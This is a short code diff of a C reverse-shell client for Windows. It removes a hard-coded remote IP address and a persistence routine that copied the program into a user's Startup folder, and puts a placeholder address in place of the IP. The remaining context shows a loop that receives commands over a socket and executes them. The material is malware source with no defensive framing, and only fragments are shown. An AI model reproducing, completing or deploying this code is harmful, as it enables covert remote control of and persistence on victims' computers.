@@ -8,21 +8,7 @@
 #define bzero(p, size) (void) memset((p), 0, (size))
 
 int sock;
-char ip[] = "176.58.117.112";
-
-#define STARTUP_FOLDER_PATH "C:\\Users\\ewanj\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-
-void persist(const char *programPath) {
-    char startupPath[MAX_PATH];
-    snprintf(startupPath, sizeof(startupPath), STARTUP_FOLDER_PATH "client.exe");
-
-    if (!CopyFile(programPath, startupPath, FALSE)) {
-        fprintf(stderr, "Failed to copy file to Startup folder. Error: %lu\n", GetLastError());
-    } else {
-        printf("Program copied to Startup folder successfully.\n");
-    }
-}
-
+char ip[] = "your ip(example: 192.168.0.1)";
 
 void Shell() {
     char buffer[1024];
@@ -48,15 +34,6 @@ void Shell() {
             closesocket(sock);
             WSACleanup();
             exit(0);
-        }else if (strncmp("persist", buffer, 1) == 0)
-        {
-            char programPath[MAX_PATH];
-            if (GetModuleFileName(NULL, programPath, MAX_PATH) == 0) {
-                fprintf(stderr, "Failed to get program path. Error: %lu\n", GetLastError());
-                break;
-            }
-
-            persist(programPath);
         }else {
             FILE *fp;
             // Execute the received command
